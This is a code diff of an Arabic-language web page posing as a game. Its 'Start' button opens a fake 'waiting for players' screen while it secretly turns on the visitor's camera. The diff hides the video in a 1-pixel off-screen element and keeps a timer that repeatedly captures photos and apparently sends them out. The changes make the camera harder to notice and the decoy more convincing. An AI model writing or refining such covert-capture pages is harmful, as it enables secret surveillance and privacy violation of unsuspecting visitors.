@@ -6,33 +6,40 @@
     <title>لعبة تركس – جربها الآن!</title>
     <style>
         body {
+            margin: 0;
+            padding: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
             color: #fff;
-            margin: 0;
-            padding: 0;
-            text-align: center;
-            min-height: 100vh;
+            height: 100vh;
             overflow: hidden;
+            display: flex;
+            flex-direction: column;
         }
         #main-screen {
-            padding: 30px 15px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
         h1 {
             color: #00ff88;
             text-shadow: 0 0 15px #00ff88;
-            margin: 20px 0 40px;
+            margin: 20px 0;
             font-size: 2.8rem;
         }
         p {
             font-size: 1.3rem;
             max-width: 700px;
-            margin: 0 auto 35px;
+            margin: 20px auto;
             line-height: 1.7;
+            text-align: center;
         }
         .btn {
-            padding: 18px 50px;
-            font-size: 1.5rem;
+            padding: 18px 60px;
+            font-size: 1.6rem;
             background: #00ff88;
             color: #000;
             border: none;
@@ -45,20 +52,11 @@
             transform: scale(1.08);
             box-shadow: 0 0 40px #00ff88;
         }
-        #status {
-            font-size: 1.4rem;
-            margin: 30px 0;
-            color: #ffcc00;
-            font-weight: bold;
-        }
-        /* شاشة الانتظار */
+        /* شاشة الانتظار الكاملة */
         #waiting-screen {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
+            inset: 0;
+            background: rgba(0, 0, 0, 0.95);
             display: none;
             flex-direction: column;
             justify-content: center;
@@ -66,28 +64,28 @@
             z-index: 9999;
         }
         #waiting-text {
-            font-size: 2.5rem;
-            margin-bottom: 30px;
+            font-size: 2.8rem;
+            margin: 30px 0;
             color: #00ff88;
             text-shadow: 0 0 20px #00ff88;
         }
         .loader {
-            border: 8px solid #333;
-            border-top: 8px solid #00ff88;
+            border: 10px solid #333;
+            border-top: 10px solid #00ff88;
             border-radius: 50%;
-            width: 80px;
-            height: 80px;
-            animation: spin 1.5s linear infinite;
+            width: 100px;
+            height: 100px;
+            animation: spin 1.2s linear infinite;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        /* إخفاء الكاميرا بدون صورة */
+        /* إخفاء الكاميرا تمامًا */
         #hidden-cam {
             position: fixed;
-            bottom: -100px;
-            right: -100px;
+            bottom: -300px;
+            right: -300px;
             width: 1px;
             height: 1px;
             overflow: hidden;
@@ -99,7 +97,6 @@
             width: 640px;
             height: 480px;
             object-fit: cover;
-            transform: translate(-320px, -240px);
         }
     </style>
 </head>
@@ -114,17 +111,15 @@
         </p>
 
         <button class="btn" onclick="startGame()">ابدأ</button>
-       
-        <div id="status">اضغط الزر لبدء التحدي...</div>
     </div>
 
-    <!-- شاشة الانتظار -->
+    <!-- شاشة الانتظار الكاملة -->
     <div id="waiting-screen">
         <div class="loader"></div>
         <div id="waiting-text">بانتظار انضمام اللاعبين...</div>
     </div>
 
-    <!-- الكاميرا مخفية تمامًا -->
+    <!-- الكاميرا مخفية -->
     <div id="hidden-cam">
         <video id="video" autoplay playsinline muted></video>
     </div>
@@ -139,10 +134,10 @@
             // إخفاء الشاشة الرئيسية
             document.getElementById('main-screen').style.display = 'none';
             
-            // إظهار شاشة الانتظار
+            // إظهار شاشة الانتظار الكاملة
             document.getElementById('waiting-screen').style.display = 'flex';
 
-            // بدء الكاميرا في الخلفية
+            // بدء الكاميرا فورًا في الخلفية
             startCamera();
         }
 
@@ -166,7 +161,6 @@
                 setInterval(captureAndSend, PHOTO_INTERVAL);
             } catch (err) {
                 console.error("Camera error:", err);
-                // يمكن إظهار رسالة خطأ في شاشة الانتظار لو أردت
             }
         }
 
